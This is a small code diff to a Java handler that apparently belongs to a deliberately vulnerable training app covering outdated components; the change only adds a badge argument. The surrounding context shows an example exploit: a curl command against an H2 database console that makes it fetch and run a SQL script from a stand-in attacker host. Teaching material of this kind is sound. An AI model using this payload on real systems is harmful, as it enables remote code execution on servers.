@@ -76,7 +76,7 @@ public class VulnerableComponentsHandler implements IRouteHandler {
              "curl -s -X POST http://target/h2-console/login.do -d \"url=jdbc:h2:mem:testdb;INIT=RUNSCRIPT+FROM+'http://attacker/cmd.sql'&user=sa&password=\""},
         });
 
-        String content = TemplateEngine.vulnerabilityBadge("A06", "Vulnerable & Outdated Components")
+        String content = TemplateEngine.vulnerabilityBadge("A06", "Vulnerable & Outdated Components", "Components")
             + info + exploits + table;
         res.getWriter().write(TemplateEngine.page("Vulnerable Components", content, true));
     }
